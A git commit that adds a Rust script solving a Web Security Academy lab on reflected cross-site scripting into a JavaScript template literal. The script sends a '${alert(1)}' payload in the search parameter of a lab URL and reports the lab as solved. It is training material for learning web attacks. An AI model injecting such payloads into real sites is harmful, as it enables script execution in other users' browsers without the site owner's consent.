19a2c847884fe0859ea7e2ddf9cc748c35b9cbf8
Ahmed Elqalaawy <elqal3awii@gmail.com>
2023-11-24 22:14:09 +0200

    Added 'Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped' lab

---
+++ Cross-site scripting (XSS)/Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped/src/main.rs
@@ -0,0 +1,76 @@
+/******************************************************************************************
+*
+* Author: Ahmed Elqalaawy (@elqal3awii)
+*
+* Date: 24/11/2023
+*
+* Lab: Reflected XSS into a template literal with angle brackets, single, double quotes, 
+*      backslash and backticks Unicode-escaped
+*
+* Steps: 1. Inject payload in the search query parameter to call the alert function
+*        2. Observe that the script has been executed
+*
+*******************************************************************************************/
+#![allow(unused)]
+/***********
+* Imports
+***********/
+use reqwest::{
+    blocking::{Client, ClientBuilder, Response},
+    header::HeaderMap,
+    redirect::Policy,
+};
+use std::{
+    collections::HashMap,
+    io::{self, Write},
+    time::Duration,
+};
+use text_colorizer::Colorize;
+
+/******************
+* Main Function
+*******************/
+fn main() {
+    // change this to your lab URL
+    let url = "https://0ade0003034f0afe8182cafc00c0005d.web-security-academy.net";
+
+    // build the client that will be used for all subsequent requests
+    let client = build_client();
+
+    // payload to call the alert function
+    let payload = "${alert(1)}";
+
+    print!(
+        "{}",
+        "❯❯ Injecting payload in the search query parameter to call the alert function.. ".white(),
+    );
+    io::stdout().flush();
+
+    // fetch the page with the injected payload
+    client
+        .get(format!("{url}?search={payload}"))
+        .send()
+        .expect(&format!(
+            "{}",
+            "[!] Failed to fetch the page with the injected payload".red()
+        ));
+
+    println!("{}", "OK".green());
+    println!(
+        "{} {}",
+        "🗹 The lab should be marked now as".white(),
+        "solved".green()
+    )
+}
+
+/*******************************************************************
+* Function used to build the client
+* Return a client that will be used in all subsequent requests
+********************************************************************/
+fn build_client() -> Client {
+    ClientBuilder::new()
+        .redirect(Policy::default())
+        .connect_timeout(Duration::from_secs(5))
+        .build()
+        .unwrap()
+}
